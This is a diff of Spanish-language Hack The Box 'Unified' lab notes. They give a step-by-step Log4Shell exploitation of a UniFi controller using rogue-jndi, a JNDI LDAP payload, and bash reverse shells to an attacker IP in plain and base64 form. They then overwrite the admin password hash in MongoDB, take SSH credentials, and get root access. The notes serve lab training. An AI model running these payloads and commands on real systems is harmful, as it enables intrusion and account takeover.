@@ -1,6 +1,46 @@
 HACK THE BOX - UNIFIED MACHINE
 
+- sudo nmap -sC -sV -sS -Pn 10.129.96.149 -oN NmapUnified                                                                                                                           -Nmap para escaneo de puertos
+
+- sudo apt install openjdk-11-jdk                                                                                                                                                   -Herramienta que nos permite elaborar archivo .jar que contiene código JAVA de la aplicación generada
+- sudo apt-get install maven                                                                                                                                                        -Nos ayuda a compilar el archivo JAR con el código Java elaborado en Open-JDK
+- git clone https://github.com/veracode-research/rogue-jndi                                                                                                                         -Herramienta que nos permite activar un servidor ldap, con el que se recibiran las peticiones ldap de la maquina a vulnerar y asi ejecutar código en el target 
+- cd rogue-jndi                                                                                                                                                                     -Nos colocamos en el directorio para poder hacer uso de todo el repositorio disponible para la vulneración
+- mvn package                                                                                                                                                                       -Crea un archivo JAR con el que explotaremos la vulnerabilidad Log4J
+- ls                                                                                                                                                                                -Listamos y deberiamos ver un directorio llamado target
+- cd target
+- ls                                                                                                                                                                                -Listamos y deberiamos ver el archivo RogueJndi-1.1.jar
+
+            -Para establecer nuestro Reverse Shell Connetion, generamos el código mostrado a continuación, pero este necesita ser encodeado en base64, ya que diferentes protocolos codifican los datos, y algunos simbolos pueden ser alterados en ese proceso, de modo tal que si codeamos nuestra data en base64, evitaremos que exista algun tipo de conflicto al establecer nuestro reverse shell proximamente
+
+- nc -lvnp 4444                                                                                                                                                                     -Para poder establecer la RSC, abrimos un puerto a la escucha con netcat.
+- echo "bash -c bash -i >& /dev/tcp/10.10.14.10/4444 0>&1" | base64                                                                                                                 -Codificamos nuestro comando de RSC en base64 y es el qe utilizaremos para el siguiente comando
+- java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.10"        -Tener mucho cuidado con los espacios y comas, todo debe ir correctamente sino la conexión no será posible, con este comando generaremos un servidor ldap, con el cual podremos interceptar las peticiones ldap realizadas por nuestro target.
+
+            -En el anterior comando se generara una dirección ldap (ldap://10.10.14.10:1389/o=tomcat), la cual copiaremos y reemplazaremos en burpsuite ("remember":"${jndi:ldap://10.10.14.10:1389/o=tomcat}",), de modo tal que al enviar la peticion interceptada con burpsuite, podremos establecer la RSC
+            -Como salida del comando Java, miraremos lo siguiente "Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload", y nuestra RSC ya estará establecida.
+
+- script /dev/null -c bash                                                                                                                                                          -Inicia un shell de Bash dentro de esta sesión de registro, lo utilizamos porque la terminal obtenido directamente de la RSC establecida es muy primitiva.
+- cd ~/home/michael                                                                                                                                                                 -Directorio en el que se encuentra nuestro primer FLAG
+- mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"                                                                                                               -El comando se utiliza para conectarse a un servidor MongoDB en el puerto 27117, acceder a la base de datos "ace" (Nombre de BD por defecto comunmente por eso la usamos) y realizar una consulta en la colección "admin", mostrando los resultados en formato JSON.
+
+            -Con el anterior resultado podemos visualizar data muy importante como es el id, email,name, password encriptada,etc. Lo mas importante aqui es darnos cuenta que la pass se encuentra encriptada en SHA-512, de modo que tratar de crackearla seria muy complicado por lo tanto buscamos otro método.
+            -Un método mas efectivo para la vulneración, es hacer un upgrade de la base de datos y reemplazar la clave códificada del administrador por una que nosotros generemos.
+
+    (En nuestro directorio ~\~/Hacking/HackTheBox/Unified)            
+- mkpasswd -m sha-512 Password1!                                                                                                                                                    -Generamos la clave codificada en sha-512
+
+    ( ReverseShell)
+- mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$bna5MeYPqsdTqWRn$LWYtRmTmlS1AKga881Pa8jag7WkQ1N9bXT6/weLtd8cXAjAik09GjiFFPcibMj7HKgadAyqmIq2HPCSYpOChA/"}})'        -Comando con el cual hacemos un upgrade de las credenciales dentro de MongoDB e insertamos la nueva password generada en el comando anterior para Administrator, Tener en cuenta que el OBJECTID tiene que ser el del Administrador. 
+- mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"                                                                                                               -Ejecutamos para verificar que la pass haya sido actualizada
+
+            -Ahora que podemos ver que la pass ha sido actualizada nos dirigimos a "https://10.129.96.149:8443/manage" e ingresamos las credenciales "Administrator:Password1!", junto con el password que generamos anteriormente, y nos damos cuenta que tenemos acceso.
+            -Por ultimo haciendo una busqueda detallada dentro del sitio encontramos que en "Settings > Site", al final de la pagina encontramos las credenciales para establecer una conexión SSH, por lo tanto nos conectamos mediante SSH
+
+- sudo ssh root@10.129.96.149                                                                                                                                                       -Nos conectamos a través de SSH y tenemos privilegios de root.
+- ls
+- cat root.txt 
 
 
-- java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjIxLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.221"                   -Tener mucho cuidado con los espacios y comas, todo debe ir correctamente sino la conexión no será posible
-- script /dev/null -c bash 
+
+            MAQUINA TERMINADA
